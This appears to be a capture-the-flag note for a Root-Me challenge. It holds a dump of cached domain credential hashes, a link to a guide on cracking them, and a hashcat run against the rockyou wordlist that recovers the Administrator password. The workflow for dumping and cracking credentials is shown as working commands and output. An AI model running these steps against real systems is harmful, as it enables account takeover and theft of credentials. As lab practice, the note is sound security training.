'''
hashcat -m1100 '15a57c279ebdfea574ad1ff91eb6ef0c:Administrator' ~/ctf/john/run/rockyou.txt --force --potfile-disable

https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials

[*] Dumping cached domain logon information (domain/username:hash)
ROOTME.LOCAL/PODALIRIUS:$DCC2$10240#PODALIRIUS#9d3e8dbe4d9816fa1a5dda431ef2f6f1
ROOTME.LOCAL/SHUTDOWN:$DCC2$10240#SHUTDOWN#9d3e8dbe4d9816fa1a5dda431ef2f6f1
ROOTME.LOCAL/Administrator:15a57c279ebdfea574ad1ff91eb6ef0c:Administrator

Dictionary cache hit:
* Filename..: /home/szhan21/ctf/john/run/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

- Device #1: autotuned kernel-accel to 1024
- Device #1: autotuned kernel-loops to 1
15a57c279ebdfea574ad1ff91eb6ef0c:administrator:ilikethat


'''
